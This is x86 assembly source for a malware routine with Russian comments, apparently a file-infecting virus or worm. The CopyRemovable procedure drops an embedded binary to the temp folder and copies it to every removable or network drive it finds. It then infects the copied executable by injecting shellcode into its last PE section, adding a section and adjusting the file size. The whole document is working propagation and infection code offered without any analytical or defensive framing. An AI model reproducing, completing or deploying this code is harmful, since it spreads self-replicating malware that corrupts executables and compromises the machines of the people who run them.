;===============================================================================;
;CopyRemovable proc BufferForData:DWORD,Delta:DWORD
;Описание: Процедура копирования зараженного файла на сьемные носители
;Вход:
;	Delta - дельта смещение
;===============================================================================;
CopyRemovable proc BufferForData:DWORD,Delta:DWORD
LOCAL Buffer:DWORD
LOCAL hFile:DWORD
LOCAL NumberBytes:DWORD
LOCAL BufferForDiskStrings:DWORD
LOCAL BufferForFileName:DWORD
LOCAL hMapping:DWORD
LOCAL hMap:DWORD
LOCAL FileSize:DWORD

	startproc
	mov ebx,Delta
;Выделяем буффер для пути
	push ebx
	call AllocBuffer
	mov Buffer,eax
;Путь для временного файла
	push eax
	push 255
	apiproc _GetTempPathA
;Получаем полный путь к зараженному файлу
	lea eax,[ebx+TempFile]
	push eax
	push Buffer
	apiproc _lstrcatA
;Создаем файл
	push 0
	push FILE_ATTRIBUTE_NORMAL
	push CREATE_ALWAYS
	push 0
	push FILE_SHARE_READ or FILE_SHARE_WRITE
	push FILE_ALL_ACCESS
	push Buffer
	apiproc _CreateFileA
	mov hFile,eax
;Записываем данные
	push 0
 	lea edx,NumberBytes
	push edx
	push SizeBinData
	lea edx,[ebx+BinData]
	push edx
	push eax
	apiproc _WriteFile
;Закрываем описатель
	push hFile
	apiproc _CloseHandle
;Выделяем буфер для имён дисков
	push ebx
	call AllocBuffer
	mov BufferForDiskStrings,eax
;Выделяем буффер для имён дисков + имя файла
	push ebx
	call AllocBuffer
	mov BufferForFileName,eax
;Получаем имена сьемных носителей
	push BufferForDiskStrings
	push 255
	apiproc _GetLogicalDriveStringsA
	mov esi,BufferForDiskStrings
NextDrive:;Перебираем все диски в поисках съемных
	push esi
	apiproc _GetDriveTypeA
	.if eax==DRIVE_REMOVABLE || eax==DRIVE_REMOTE
;Получаем полный путь к диску
		push esi
		push BufferForFileName
		apiproc _lstrcpyA
;Получаем полный путь к новому файлу
		push ebx
		call GetRandomFileName

		push eax
		push BufferForFileName
		apiproc _lstrcatA
;Нет ли данного диска уже в наборе?
		mov al,byte ptr [esi]
		mov ecx,BufferForData
NextResDisk:
		.if al==byte ptr [ecx]
			jmp Next
		.endif
		add ecx,3
		.if byte ptr [ecx]==0
			jmp Ok
		.endif 
		jmp NextResDisk
Ok:
;Копируем один в другой
		push TRUE
		push BufferForFileName
		push Buffer
		apiproc _CopyFileA
		.if eax==0
			jmp Next
		.endif
;Отмечаем, что на диск были скопированы данные
		push esi
		push BufferForData
		apiproc _lstrcatA
;Копируем файл на сьемный носитель
;Заражаем файл
;Открываем файл
		push NULL
		push FILE_ATTRIBUTE_NORMAL
		push OPEN_EXISTING
		push NULL
		push FILE_SHARE_WRITE or FILE_SHARE_READ 
		push GENERIC_WRITE or  GENERIC_READ
		push BufferForFileName
		apiproc _CreateFileA
;Проверка на правильность открытия файла
		.if eax==-1
			jmp EndCopyRemovable
		.endif
		mov hFile,eax
;Создаем объект "проекция файла"
		push NULL
		push NULL
		push NULL
		PUSH PAGE_READWRITE
		push NULL
		push eax
		apiproc _CreateFileMappingA
;Проверка на правильность создания проекции
		.if eax==0
			jmp EndCopyRemovable
		.endif
		mov hMapping,eax
;Проецируем файл на адресное пространство
		push 0
		push 0
		push 0
		push FILE_MAP_ALL_ACCESS
		push eax	
		apiproc _MapViewOfFile
		.if eax==0
			jmp EndCopyRemovable
		.endif
		mov hMap,eax
;Правильный файл?
		push hMap
		call ValidPE
		.if eax==0
			jmp ToInfect1
		.endif
;Закрыть описатель проекции
		push hMapping
		apiproc _CloseHandle
;Не заражен ли уже файл?
		push hMap
		call IsInfect
		.if eax==1
			jmp ToInfect1
		.endif
;Есть ли в файле оверлей?
		push 0
		push hFile
		apiproc _GetFileSize
		mov FileSize,eax

		push hMap
		push FileSize
		call IsOverlay
		.IF eax==1
			jmp ToInfect1
		.ENDIF	
;Заражаем файл
		push ebx
		push ShellCodeLength
		lea eax,[ebx+ShellCode]
		push eax	
		push hMap
		push BufferForFileName
		call InfectExLastSection
;Добавляем пустую секцию
		push ebx
		push hMap
		push BufferForFileName
		call NewSection
ToInfect1:;файл уже заражен или его нельзя заразить
		push hMap
		apiproc _UnmapViewOfFile

		push hFile
		apiproc _CloseHandle
;Изменяем размер
		push ebx
		push BufferForFileName
		call ChangeFileSize
	.endif
Next:
	add esi,4
	.if byte ptr [esi]!=0
		jmp NextDrive;Обрабатываем следующий диск
	.endif
EndCopyRemovable:
	push ebx
	push Buffer
	call FreeBuffer
	push ebx
	push BufferForDiskStrings
	call FreeBuffer
	push ebx
	push BufferForFileName
	call FreeBuffer
	endproc
	ret
CopyRemovable endp
;===============================================================================;